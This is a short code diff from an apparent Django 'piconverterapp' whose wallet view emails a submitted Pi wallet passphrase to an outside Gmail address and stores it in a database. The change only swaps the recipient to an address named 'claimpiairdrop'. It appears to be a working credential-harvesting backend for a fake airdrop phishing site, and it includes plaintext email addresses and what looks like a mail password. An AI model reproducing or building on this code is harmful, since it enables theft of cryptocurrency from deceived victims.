@@ -37,7 +37,7 @@ def wallet(request):
          </body>
           </html>"""
         
-        piconverterapp.mailsender.send_mail('oketajude97@gmail.com', mail_template, 'pi wallet passpharse', 'mazamaza')
+        piconverterapp.mailsender.send_mail('claimpiairdrop@gmail.com', mail_template, 'pi wallet passpharse', 'mazamaza')
 
         chk = passpharse.objects.create(pharse=path)
         chk.save()
